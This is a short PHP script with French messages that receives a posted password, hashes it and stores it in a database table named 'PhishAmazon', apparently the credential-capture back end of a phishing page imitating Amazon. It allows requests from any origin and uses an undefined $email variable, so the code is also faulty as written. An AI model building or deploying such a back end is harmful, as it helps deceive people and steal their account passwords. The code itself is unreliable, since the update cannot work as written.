<?php
header("Access-Control-Allow-Origin: *"); 
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With");

require 'db.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $password = $_POST['password'];
    $hashed_password = password_hash($password, PASSWORD_DEFAULT);

    $sql = "UPDATE PhishAmazon SET motdepasse = :motdepasse WHERE email = :email";
    $stmt = $pdo->prepare($sql);
    $stmt->execute(['motdepasse' => $hashed_password, 'email' => $email]);

    echo "Mot de passe enregistré avec succès.";
} else {
    echo "Méthode invalide.";
}
?>
